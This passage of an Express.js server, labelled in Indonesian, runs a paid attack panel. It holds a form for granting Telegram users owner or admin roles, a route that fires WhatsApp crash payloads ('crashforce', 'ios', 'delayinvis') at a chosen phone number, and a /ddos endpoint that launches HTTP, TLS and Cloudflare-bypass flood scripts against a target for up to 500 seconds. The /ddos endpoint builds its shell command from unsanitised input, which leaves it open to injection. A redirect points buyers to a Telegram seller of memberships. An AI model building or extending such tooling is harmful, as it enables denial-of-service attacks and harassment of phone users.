  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    html, body {
      font-family: 'Poppins', sans-serif;
      background: #000;
      color: white;
      height: 100%;
      width: 100%;
      overflow-x: hidden;
      position: relative;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 15px;
      padding-bottom: 80px;
      position: relative;
      z-index: 1;
      background: linear-gradient(135deg, #0a0a2a 0%, #000000 50%, #1a1a4a 100%);
    }

    #particles-js {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
    }

    .video-banner {
      width: 100%;
      height: 120px;
      border-radius: 12px;
      overflow: hidden;
      margin-bottom: 15px;
      box-shadow: 0 4px 15px rgba(30, 58, 138, 0.4);
      border: 1px solid rgba(30, 58, 138, 0.4);
      background: rgba(30, 58, 138, 0.1);
    }

    .video-banner video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      filter: brightness(0.9) contrast(1.1);
    }

    .form-card {
      background: rgba(30, 58, 138, 0.08);
      border: 1px solid rgba(30, 58, 138, 0.3);
      backdrop-filter: blur(15px);
      -webkit-backdrop-filter: blur(15px);
      animation: fadeInUp 0.8s ease both;
      box-shadow: 
        0 6px 20px rgba(30, 58, 138, 0.3),
        inset 0 1px 0 rgba(255, 255, 255, 0.1);
      padding: 20px;
    }

    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    button.glow {
      background: linear-gradient(135deg, #1e3a8a, #3b82f6);
      box-shadow: 0 0 15px rgba(30, 58, 138, 0.6);
      transition: all 0.3s ease;
      border: 1px solid rgba(59, 130, 246, 0.3);
      font-size: 14px;
      padding: 10px;
    }

    button.glow:hover {
      transform: scale(1.02);
      box-shadow: 0 0 20px rgba(30, 58, 138, 0.8);
      background: linear-gradient(135deg, #3b82f6, #1e3a8a);
    }

    .bottom-menu {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(15px);
      -webkit-backdrop-filter: blur(15px);
      border-top: 1px solid rgba(30, 58, 138, 0.4);
      z-index: 1000;
      padding: 10px 0;
    }

    .menu-container {
      display: flex;
      justify-content: space-around;
      align-items: center;
      max-width: 400px;
      margin: 0 auto;
    }

    .menu-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      color: rgba(255, 255, 255, 0.7);
      text-decoration: none;
      padding: 6px 8px;
      border-radius: 10px;
      transition: all 0.3s ease;
      flex: 1;
      text-align: center;
      background: rgba(30, 58, 138, 0.1);
      backdrop-filter: blur(8px);
      font-size: 0.7rem;
    }

    .menu-item:hover {
      background: rgba(30, 58, 138, 0.3);
      color: #ffffff;
      box-shadow: 0 3px 10px rgba(30, 58, 138, 0.4);
      transform: translateY(-1px);
    }

    .menu-item.active {
      background: rgba(30, 58, 138, 0.3);
      color: #ffffff;
      box-shadow: 0 3px 10px rgba(30, 58, 138, 0.4);
    }

    .menu-icon {
      font-size: 1rem;
      margin-bottom: 3px;
    }

    .menu-label {
      font-size: 0.65rem;
    }

    .back-to-dashboard {
      position: absolute;
      top: 10px;
      left: 10px;
      color: #fff;
      text-decoration: none;
      background: rgba(30, 58, 138, 0.3);
      padding: 5px 8px;
      border-radius: 6px;
      font-size: 12px;
      z-index: 2;
      display: flex;
      align-items: center;
      gap: 4px;
      transition: all 0.3s ease;
      backdrop-filter: blur(8px);
      border: 1px solid rgba(30, 58, 138, 0.3);
    }

    .back-to-dashboard:hover {
      background: rgba(30, 58, 138, 0.5);
      box-shadow: 0 0 10px rgba(30, 58, 138, 0.4);
    }

    /* Custom input styles */
    .input-field {
      background: rgba(30, 58, 138, 0.1);
      border: 1px solid rgba(30, 58, 138, 0.4);
      color: #bfdbfe;
      backdrop-filter: blur(8px);
      font-size: 14px;
      padding: 8px;
    }

    .input-field::placeholder {
      color: #93c5fd;
      font-size: 13px;
    }

    .input-field:focus {
      border-color: rgba(30, 58, 138, 0.8);
      box-shadow: 0 0 10px rgba(30, 58, 138, 0.4);
      background: rgba(30, 58, 138, 0.15);
    }

    .container {
      width: 100%;
      max-width: 380px;
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 10px;
    }

    h1 {
      font-size: 1.5rem;
      margin-bottom: 15px;
    }

    label {
      font-size: 13px;
      margin-bottom: 4px;
    }

    .space-y-4 > * {
      margin-bottom: 12px;
    }
  </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen relative">
  <div id="particles-js"></div>

  <a href="/dashboard" class="back-to-dashboard">
    <i class="fas fa-arrow-left"></i> Back
  </a>

  <div class="container">
    <!-- Video Banner di atas form -->
    <div class="video-banner">
      <video autoplay muted loop playsinline>
        <source src="https://files.catbox.moe/ar2frm.mp4" type="video/mp4">
      </video>
    </div>

    <main class="form-card w-full rounded-xl">
      <h1 class="text-2xl font-bold text-blue-400 text-center mb-4">Tambah Telegram ID</h1>
      <form action="/add-telegram" method="POST" class="space-y-3">
        <div>
          <label class="block text-xs mb-1 text-blue-200">Telegram ID</label>
          <input type="number" name="telegramId" class="w-full rounded input-field focus:ring-1 focus:ring-blue-500 text-sm" placeholder="Masukkan ID Telegram" required>
        </div>
        <div>
          <label class="block text-xs mb-1 text-blue-200">Role</label>
          <select name="role" class="w-full rounded input-field focus:ring-1 focus:ring-blue-500 text-sm" required>
            <option value="owners">Owner</option>
            <option value="akses">Akses</option>
            <option value="admin">Admin</option>
          </select>
        </div>
        <button type="submit" class="glow w-full rounded text-white font-semibold text-sm mt-2">
          <i class="fas fa-plus mr-1"></i> Tambah User Telegram
        </button>
      </form>
    </main>
  </div>

  <div class="bottom-menu" id="bottomMenu">
    <div class="menu-container">
      <a href="/dashboard" class="menu-item"><i class="fas fa-home menu-icon"></i><span class="menu-label">Dashboard</span></a>
      <a href="/execution" class="menu-item"><i class="fas fa-bolt menu-icon"></i><span class="menu-label">Execution</span></a>
      <a href="/tools" class="menu-item"><i class="fas fa-tools menu-icon"></i><span class="menu-label">Tools</span></a>
      <a href="/channel" class="menu-item"><i class="fab fa-whatsapp menu-icon"></i><span class="menu-label">Channel</span></a>
    </div>
  </div>

  <script>
    // Initialize particles dengan tema biru
    particlesJS('particles-js', {
      particles: {
        number: { value: 40, density: { enable: true, value_area: 600 } },
        color: { value: "#1e3a8a" },
        opacity: { value: 0.3, random: true },
        size: { value: 2, random: true },
        line_linked: {
          enable: true,
          distance: 120,
          color: "#1e3a8a",
          opacity: 0.2,
          width: 1
        },
        move: { enable: true, speed: 1.5, random: true }
      },
      interactivity: {
        detect_on: "canvas",
        events: { onhover: { enable: true, mode: "repulse" } },
        modes: { repulse: { distance: 80 } }
      },
      retina_detect: true
    });

    // Handle keyboard appearance on mobile
    const bottomMenu = document.querySelector('.bottom-menu');
    if (window.visualViewport) {
      window.visualViewport.addEventListener('resize', () => {
        const heightDiff = window.innerHeight - window.visualViewport.height;
        if (heightDiff > 100) {
          bottomMenu.style.transform = 'translateY(100%)';
          bottomMenu.style.transition = 'transform 0.3s ease';
        } else {
          bottomMenu.style.transform = 'translateY(0)';
        }
      });
    }

    // Form validation
    document.querySelector('form').addEventListener('submit', function(e) {
      const telegramId = this.querySelector('input[name="telegramId"]').value.trim();
      
      if (!telegramId) {
        e.preventDefault();
        alert('Telegram ID harus diisi!');
        return;
      }
      
      if (telegramId.length < 5) {
        e.preventDefault();
        alert('Telegram ID terlalu pendek!');
        return;
      }
    });

    // Auto-hide bottom menu when keyboard appears (mobile)
    document.addEventListener('DOMContentLoaded', function() {
      const bottomMenu = document.getElementById('bottomMenu');
      
      if (window.visualViewport) {
        const initialHeight = window.visualViewport.height;
        
        window.visualViewport.addEventListener('resize', () => {
          const heightDiff = initialHeight - window.visualViewport.height;
          
          if (heightDiff > 100) {
            bottomMenu.style.transform = 'translateY(100%)';
            bottomMenu.style.transition = 'transform 0.3s ease';
          } else {
            bottomMenu.style.transform = 'translateY(0)';
          }
        });
      }
    });
  </script>
</body>
</html>
  `);
});

/*Add id telegram*/ 
app.post("/add-telegram", (req, res) => {
  const { telegramId, role } = req.body;

  if (!telegramId || !role) {
    return res.redirect(
      "/dashboard?msg=" + encodeURIComponent("❌ Telegram ID dan role wajib diisi!") + "&type=error"
    );
  }

  const idNum = Number(telegramId);

  try {
    if (role === "owners" || role === "akses") {
      const aksesPath = path.join(__dirname, "akses.json");
      let aksesData = JSON.parse(fs.readFileSync(aksesPath, "utf8"));

      if (!aksesData[role]) {
        return res.redirect(
          "/dashboard?msg=" + encodeURIComponent("❌ Role tidak valid di akses.json!") + "&type=error"
        );
      }

      if (aksesData[role].includes(idNum)) {
        return res.redirect(
          "/dashboard?msg=" + encodeURIComponent(`⚠️ ID ${idNum} sudah ada di ${role}.`) + "&type=warning"
        );
      }

      aksesData[role].push(idNum);
      fs.writeFileSync(aksesPath, JSON.stringify(aksesData, null, 2));
      return res.redirect(
        "/dashboard?msg=" + encodeURIComponent(`ID ${idNum} berhasil ditambahkan ke ${role}!`) + "&type=success"
      );
    }

    if (role === "admin") {
      const adminPath = path.join(__dirname, "database", "admin.json");
      let adminData = JSON.parse(fs.readFileSync(adminPath, "utf8"));

      if (!Array.isArray(adminData)) {
        return res.redirect(
          "/dashboard?msg=" + encodeURIComponent("❌ Format admin.json harus berupa array []") + "&type=error"
        );
      }

      if (adminData.includes(idNum)) {
        return res.redirect(
          "/dashboard?msg=" + encodeURIComponent(`⚠️ ID ${idNum} sudah ada di admin.json.`) + "&type=warning"
        );
      }

      adminData.push(idNum);
      fs.writeFileSync(adminPath, JSON.stringify(adminData, null, 2));
      return res.redirect(
        "/dashboard?msg=" + encodeURIComponent(`✅ ID ${idNum} berhasil ditambahkan ke admin.json!`) + "&type=success"
      );
    }

    return res.redirect(
      "/dashboard?msg=" + encodeURIComponent("❌ Role tidak dikenal!") + "&type=error"
    );
  } catch (err) {
    console.error(err);
    return res.redirect(
      "/dashboard?msg=" + encodeURIComponent("❌ Terjadi kesalahan server!") + "&type=error"
    );
  }
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./XMboy/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["delayinvis", "ios", "crashforce"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=delayinvis atau ?mode=ios atau ?mode=crashforce."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      if (mode === "delayinvis") {
        delayinvishard(target);
      } else if (mode === "ios") {
        forceios(target);
      } else if (mode === "crashforce") {
        forclose(target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✅ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("❌ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});


app.use(express.json()); // untuk parse JSON body
app.use(express.urlencoded({ extended: true })); // untuk parse form data

app.post("/ddos", async (req, res) => {
  try {
    console.log('=== DDoS BACKEND DEBUG ===');
    console.log('🔧 Headers:', req.headers);
    console.log('🔧 Body received:', req.body);
    console.log('🔧 Cookies:', req.cookies);
    
    // Check session
    const username = req.cookies?.sessionUser;
    if (!username) {
      console.log('❌ No session user');
      return res.status(401).json({
        status: false,
        message: "Please login first"
      });
    }

    const { metode, target, time } = req.body;
    
    console.log('📥 Parsed body:', { metode, target, time });
    
    // Debug validation
    if (!metode) console.log('❌ Missing: metode');
    if (!target) console.log('❌ Missing: target');
    if (!time) console.log('❌ Missing: time');
    
    if (!metode || !target || !time) {
      return res.status(400).json({
        status: false,
        message: `Missing parameters: metode=${!!metode}, target=${!!target}, time=${!!time}`
      });
    }

    const duration = parseInt(time);
    if (isNaN(duration) || duration < 1 || duration > 500) {
      return res.status(400).json({
        status: false,
        message: "Time must be 1-500 seconds"
      });
    }

    const validMethods = ["HTTP-FLOOD", "TLS-FLOOD", "BYPASS", "RAW", "CF-BYPASS"];
    const methodUpper = metode.toUpperCase();
    
    if (!validMethods.includes(methodUpper)) {
      return res.status(400).json({
        status: false,
        message: `Method not supported. Available: ${validMethods.join(', ')}`
      });
    }

    const methodFile = path.join(__dirname, "methods", `${methodUpper}.js`);
    if (!fs.existsSync(methodFile)) {
      return res.status(404).json({
        status: false,
        message: `Method file not found: ${methodUpper}.js`
      });
    }

    console.log(`🚀 Launching DDoS as ${username}: ${methodUpper} ${target} ${duration}`);

    // Execute DDoS
    const command = `node "${methodFile}" ${target} ${duration} 64`;
    
    exec(command, {
      cwd: path.join(__dirname, "methods"),
      timeout: (duration + 30) * 1000
    }, (error, stdout, stderr) => {
      if (error) console.error(`❌ DDoS Error:`, error.message);
      if (stderr) console.warn(`⚠️ DDoS Stderr:`, stderr);
      if (stdout) console.log(`✅ DDoS Output:`, stdout);
    });

    return res.json({
      status: true,
      Target: target,
      Methods: methodUpper,
      Time: duration,
      Message: `DDoS attack launched! Running for ${duration} seconds`
    });

  } catch (err) {
    console.error("❌ DDoS endpoint error:", err);
    return res.status(500).json({
      status: false,
      message: `Server error: ${err.message}`
    });
  }
});

app.get("/Rembo", (req, res) => {
  const { text } = req.query;

  // Default pesan kalau query kosong
  const message = encodeURIComponent(
    text || "Haloo Rembo, saya tertarik dengan membership."
  );

  res.redirect(`https://t.me/RmboXcrash?text=${message}`);
});


app.listen(PORT, () => {
  console.log(`✅ Server aktif di port ${PORT}`);
});